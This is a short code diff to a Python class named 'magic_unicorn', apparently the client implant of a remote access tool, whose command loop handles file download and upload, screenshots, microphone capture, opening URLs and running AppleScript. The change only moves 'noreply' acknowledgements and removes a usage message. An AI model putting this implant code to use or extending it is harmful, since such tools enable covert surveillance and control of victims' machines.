@@ -59,7 +59,7 @@ class magic_unicorn:
 
     def upload(self, output_filename):
         if not output_filename.strip():
-            self.handler.send("Usage: download <remote_file>".encode("UTF-8"))
+            pass
         else:
             if not os.path.isfile(output_filename):
                 self.handler.send((self.badges.E +"Local file: {}: does not exist!".format(output_filename)).encode("UTF-8"))
@@ -204,8 +204,10 @@ class magic_unicorn:
                     self.handler.send(platform.node().encode("UTF-8"))
                 elif command[0] == "download":
                     self.upload(command[1])
+                    self.handler.send("noreply".encode("UTF-8"))
                 elif command[0] == "upload":
                     self.download(command[1])
+                    self.handler.send("noreply".encode("UTF-8"))
                 elif command[0] == "screenshot":
                     self.screenshot()
                 elif command[0] == "mic":
@@ -217,6 +219,7 @@ class magic_unicorn:
                     break
                 elif command[0] == "openurl":
                     self.openurl(command[1])
+                    self.handler.send("noreply".encode("UTF-8"))
                 elif command[0] == "chdir":
                     self.chdir(command[1])
                 elif command[0] == "say":
@@ -233,7 +236,6 @@ class magic_unicorn:
                     self.execute_osascript(command[1])
                 else:
                     pass
-                self.handler.send("noreply".encode("UTF-8"))
         sys.exit()
 
 
